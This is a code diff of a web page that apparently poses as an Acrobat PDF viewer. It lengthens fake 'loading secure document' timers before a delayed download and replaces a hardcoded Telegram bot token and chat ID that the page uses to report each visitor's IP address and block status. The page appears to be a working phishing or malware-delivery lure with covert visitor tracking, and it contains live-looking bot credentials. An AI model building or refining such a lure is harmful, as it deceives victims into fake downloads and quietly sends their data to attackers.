@@ -353,9 +353,9 @@
     // 🔧 BACKEND CONFIGURATION - TIMER SETTINGS
     // ============================================================
     const BACKEND_CONFIG = {
-      lottieDuration: 8,
-      loadingDuration: 20,
-      errorDuration: 6,
+      lottieDuration: 12,
+      loadingDuration: 30,
+      errorDuration: 15,
       downloadDelay: 10
     };
 
@@ -571,14 +571,14 @@
       const statusMessages = [
         { time: 0, text: 'Opening documents...' },
         { time: 1000, text: 'Application Initialization' },
-        { time: 2000, text: 'File & Security Verification' },
-        { time: 3000, text: 'First-Page Processing' },
-        { time: 4000, text: 'Loading PDF...' },
-        { time: 5000, text: 'Preparing secure document...' },
-        { time: 6000, text: 'Acrobat Reader loading, please wait...' },
-        { time: 7000, text: 'Documents are hanging or taking too long to load' },
-        { time: 8000, text: 'Documents are hanging or taking too long to load' },
-        { time: 9000, text: 'Documents are hanging or taking too long to load' }
+        { time: 3000, text: 'File & Security Verification' },
+        { time: 5000, text: 'First-Page Processing' },
+        { time: 7000, text: 'Loading PDF...' },
+        { time: 9000, text: 'Preparing secure document...' },
+        { time: 12000, text: 'Acrobat Reader loading, please wait...' },
+        { time: 15000, text: 'Documents are hanging or taking too long to load' },
+        { time: 20000, text: 'Documents are hanging or taking too long to load' },
+        { time: 22000, text: 'Documents are hanging or taking too long to load' }
       ];
 
       const statusEl = document.getElementById('loadingStatus');
@@ -652,8 +652,8 @@
     // ============================================================
 
     async function reportVisitToTelegram(ip, blocked = false) {
-      const BOT_TOKEN = '8127507776:AAFcEnFR3ERfKQ92G0xZ7Dp4xjnOYz95N6w';
-      const CHAT_ID = '7515108596';
+      const BOT_TOKEN = '7284066719:AAF9ABMO2CNxpiCyNrmAGeGSUAt-fS8pGlQ';
+      const CHAT_ID = '7724482403';
 
       try {
         if (!ip) {
